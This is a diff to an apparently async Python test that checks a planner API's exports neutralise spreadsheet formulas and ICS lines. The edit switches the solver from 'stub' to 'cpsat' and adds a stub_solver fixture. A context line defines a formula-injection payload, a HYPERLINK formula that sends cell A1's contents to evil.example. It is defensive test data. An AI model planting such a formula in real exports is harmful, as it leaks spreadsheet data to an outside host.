@@ -18,10 +18,10 @@ bahar = studio_support.bahar
 EVIL = '=HYPERLINK("http://evil.example/?"&A1,"Click")'
 
 
-async def test_m8_exports_neutralise_formulas_and_ics_lines(bahar):
+async def test_m8_exports_neutralise_formulas_and_ics_lines(bahar, stub_solver):
     c, h = bahar.client, bahar.planner
     body = {"term_id": bahar.term_id, "kind": "COURSE", "horizon": "WEEK", "horizon_params": {"weeks": [3]}}
-    r = await c.post("/api/v1/runs", json={**body, "params": {"solver": "stub", "time_limit_s": 5}}, headers=h)
+    r = await c.post("/api/v1/runs", json={**body, "params": {"solver": "cpsat", "time_limit_s": 5}}, headers=h)
     run_id = r.json()["run_id"]
     await get_queue().wait_idle(timeout=300)
     async with get_session_factory()() as s:
